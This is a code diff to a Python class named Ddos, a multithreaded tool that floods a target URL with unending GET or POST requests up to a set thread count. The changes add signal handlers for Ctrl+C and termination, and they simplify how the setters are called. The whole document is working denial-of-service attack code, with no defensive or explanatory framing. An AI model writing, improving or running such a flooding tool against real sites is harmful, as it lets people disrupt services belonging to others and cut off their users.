@@ -1,4 +1,5 @@
 from threading import Thread
+import signal
 import requests
 
 class Ddos:
@@ -9,17 +10,15 @@ class Ddos:
 		self.setUrl(url)
 		self.setMethod(methodId)
 		self.setMaxThread(maxThread)
-		if headers != None:
-			self.setHeaders(headers)
-		if getParam != None:
-			self.setGetParam(getParam)
-		if postData != None:
-			self.setPostData(postData)
+
+		self.setHeaders(headers)
+		self.setGetParam(getParam)
+		self.setPostData(postData)
 
 	def start(self):
-		# if not (self.url and self.methodId and self.maxThread):
-		# 	print('Error: nil value.')
-		# 	return
+		# 监听ctrl+c中断信号
+		signal.signal(signal.SIGINT, exit)
+		signal.signal(signal.SIGTERM, exit)
 
 		while True:
 			if self.runningThread < self.maxThread:
@@ -35,6 +34,7 @@ class Ddos:
 			res = requests.get(self.url, params=self.getParam, headers=self.headers)
 		elif self.methodId == 1:
 			res = requests.post(self.url, data=self.postData)
+		
 		self.status_code = res.status_code
 
 		self.runningThread -= 1
